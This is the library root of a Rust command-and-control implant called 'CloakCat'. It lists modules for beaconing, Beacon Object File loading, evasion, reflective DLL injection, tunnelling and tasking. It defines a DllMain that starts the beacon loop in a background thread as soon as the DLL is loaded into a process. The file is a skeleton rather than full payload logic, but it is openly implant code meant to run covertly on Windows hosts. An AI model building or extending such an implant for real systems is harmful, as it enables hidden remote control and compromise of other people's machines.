//! CloakCat agent library — shared by the binary and DLL targets.
//!
//! Nightly is required for `c_variadic` (BeaconPrintf varargs support in the
//! Windows BOF API compatibility layer).
#![cfg_attr(target_os = "windows", feature(c_variadic))]

mod beacon;
mod bof;
mod codec;
mod config;
mod evasion;
mod exec;
mod host;
mod io;
pub mod protocol;
pub mod srdi;
mod tasks;
mod transport;
mod tunnel;
pub mod utils;

/// Async beacon main loop.  Called by `main()` and `DllMain`.
pub async fn beacon_main() -> anyhow::Result<()> {
    beacon::run().await
}

// ── Windows DLL entry point ────────────────────────────────────────────────

#[unsafe(no_mangle)]
#[cfg(target_os = "windows")]
pub extern "system" fn DllMain(
    _hinst: *mut u8,
    reason: u32,
    _reserved: *mut u8,
) -> i32 {
    if reason == 1 {
        // DLL_PROCESS_ATTACH — spawn a background thread so we don't block loader lock.
        std::thread::spawn(|| {
            let rt = tokio::runtime::Runtime::new().unwrap();
            rt.block_on(async {
                let _ = beacon_main().await;
            });
        });
    }
    1 // TRUE
}
